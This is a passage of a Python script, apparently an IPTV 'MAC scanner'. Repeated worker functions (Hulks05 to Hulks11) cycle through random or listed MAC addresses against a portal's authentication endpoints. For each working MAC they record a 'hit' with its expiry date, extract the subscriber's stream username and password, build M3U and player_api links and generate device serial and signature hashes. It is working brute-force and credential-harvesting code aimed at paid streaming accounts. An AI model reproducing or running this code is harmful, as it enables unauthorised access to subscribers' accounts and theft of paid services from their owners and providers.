			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d5():
	global hitc
	global hitr
	global tokenr
	for mac in range(5,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks05"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d6():
	global hitc
	global hitr
	global tokenr
	for mac in range(6,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks06"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d7():
	global hitc
	global hitr
	global tokenr
	for mac in range(7,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks07"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d8():
	global hitc
	global hitr
	global tokenr
	for mac in range(8,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks08"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d9():
	global hitc
	global hitr
	global tokenr
	for mac in range(9,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks09"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d10():
	global hitc
	global hitr
	global tokenr
	for mac in range(10,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks10"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d11():
	global hitc
	global hitr
	global tokenr
	for mac in range(11,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks11"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
